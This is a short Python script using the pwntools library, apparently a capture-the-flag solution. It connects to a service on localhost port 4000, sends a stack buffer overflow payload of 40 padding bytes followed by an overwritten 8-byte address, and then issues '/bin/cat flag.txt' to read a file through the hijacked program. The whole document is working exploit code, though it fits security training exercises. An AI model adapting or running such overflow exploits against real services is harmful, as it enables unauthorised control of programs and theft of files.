from pwn import *
from time import sleep

EXPLOIT = b'A'*40 + bytes.fromhex('8877665544332211')  + b'\n'

conn = remote('localhost',4000)
print(conn.recvuntil(b'>>> '))

conn.send(EXPLOIT)
sleep(1)
conn.send(b'/bin/cat flag.txt\n')

print(conn.recv())

conn.close()
